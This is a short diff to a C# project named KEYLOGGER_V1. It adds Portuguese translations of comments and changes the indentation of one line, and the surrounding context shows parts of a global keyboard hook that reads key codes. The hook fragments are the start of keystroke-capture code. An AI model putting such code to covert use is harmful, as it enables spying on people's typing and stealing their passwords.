@@ -12,6 +12,7 @@ namespace KEYLOGGER_V1
         #region Constant, Structure and Delegate Definitions
         /// <summary>
         /// defines the callback type for the hook
+        /// Define o tipo de retorno de chamada para o gancho
         /// </summary>
         public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
 
@@ -46,6 +47,7 @@ namespace KEYLOGGER_V1
         #region Instance Variables
         /// <summary>
         /// The collections of keys to watch for: A coleção de chaves asd
+        /// As coleções de chaves para assistir
         /// </summary>
         public List<Keys> HookedKeys = new List<Keys>();
         /// <summary>
@@ -112,7 +114,7 @@ namespace KEYLOGGER_V1
         /// <returns></returns>
         public int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
         {
-            if (code >= 0)
+           if (code >= 0)
             {
                 Keys key = (Keys)lParam.vkCode;
                 if (_hookAll ? true : HookedKeys.Contains(key))
